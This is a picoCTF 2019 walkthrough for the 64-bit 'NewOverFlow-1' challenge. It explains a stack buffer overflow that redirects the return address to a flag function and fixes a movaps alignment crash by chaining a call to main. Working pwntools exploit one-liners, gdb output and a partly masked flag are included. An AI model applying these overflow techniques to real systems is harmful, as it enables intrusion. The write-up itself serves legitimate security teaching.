# NewOverFlow-1
200 points

### Description
*"Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123 on the shell server. Source."*

### Solution
This is similar to [OverFlow 1](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%234%20-%20OverFlow%201.md), but this time with a 64-bit architecture. This just means that the return address will be twice as long. We can use the same `gdb` technique from the [previous problem](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%236%20-%20OverFlow%202.md) to find out how many characters we need in order to overwrite the return address. Go ahead and try this on your own.

Once we get this value, we need to get the return address of `flag`. You can use `objdump` to do this from the command line:
```bash
$ objdump -D ./vuln | grep "<flag>"
```
**NOTE:** The `-D` flag tells `objdump` to disassemble everything in the executable.

Now we'll use the same method that we used in OverFlow 1, but this time we need to use the `p64` function since we are on a 64-bit architecture. However, if we try to do this like we normally would, we will only get segmentation faults. Let's look at this in `gdb`. You'll want to do this from your home directory on the server since you'll need a fake `flag.txt` for the debugger to use.
```bash
$ gdb /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123/vuln
(gdb) run <<< $(python -c "from pwn import *; print('a'*(64+8) + p64(0x400767))")
Starting program: /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln <<< $(python -c "from pwn import *; print('a'*(64+8) + p64(0x400767))")
/bin/bash: warning: command substitution: ignored null byte in input
Welcome to 64-bit. Give me a string that gets you the flag: 

Program received signal SIGSEGV, Segmentation fault.
buffered_vfprintf (s=s@entry=0x7f037581a760 <_IO_2_1_stdout_>, format=format@entry=0x7fff5751b508 "pico\n", args=args@entry=0x7fff5751b428) at vfprintf.c:2314
2314    vfprintf.c: No such file or directory.
(gdb) set disassembly-flavor intel
(gdb) disas
Dump of assembler code for function buffered_vfprintf:
...
   0x00007f037548c6dc <+140>:   punpcklqdq xmm0,xmm0
   0x00007f037548c6e0 <+144>:   mov    DWORD PTR [rsp+0xa4],eax
   0x00007f037548c6e7 <+151>:   lea    rax,[rip+0x389072]        # 0x7f0375815760 <_IO_helper_jumps>
=> 0x00007f037548c6ee <+158>:   movaps XMMWORD PTR [rsp+0x50],xmm0
   0x00007f037548c6f3 <+163>:   mov    QWORD PTR [rsp+0x108],rax
   0x00007f037548c6fb <+171>:   call   0x7f0375489420 <_IO_vfprintf_internal>
   0x00007f037548c700 <+176>:   mov    r12d,eax
...
```

I'm not showing the full output here, just the part of the code that's causing the error. It's the `movaps` command. If we check out the [reference](https://c9x.me/x86/html/file_module_x86_id_180.html) for this command, we'll see this:
>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.

So, let's check that the return address is 16-byte aligned (i.e. divisible by 16):
```bash
(gdb) p $rsp+50
$1 = (void *) 0x7fff57518d6a
(gdb) p ((unsigned int)$1) % 16
$2 = 10
```

It's not 16-bit aligned. This is why the exploit isn't working and the program is crashing. A creative way that we often get around issues like this is by calling other functions before calling the function we want to use in order to see if the compiler will align things differently and fix our problem.

In this situation, we can try making another call to `main` before calling `flag`. You can get the address for main using `objdump` or `gdb`.
```bash
$ python -c "from pwn import *; print('\x90'*(64+8) + p64(0x00000000004007e8) + p64(0x0000000000400767))" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
Welcome to 64-bit. Give me a string that gets you the flag:
picoCTF{XXX}
Segmentation fault (core dumped)
```

**NOTE:** This is one of those problems where each user has a different flag. Make sure you go through the steps on your own machine to get the flag.

<details>
  <summary>Flag:</summary>
  picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_XXXXXXXX}
</details>

[Next Problem](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%238%20-%20NewOverFlow-2.md)

[Return to Binary Exploitation](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%230%20-%20Binary%20Exploitation%20Homepage.md)

[Return to Homepage](https://github.com/sdvickers98/picoCTF-2019-Walkthrough)
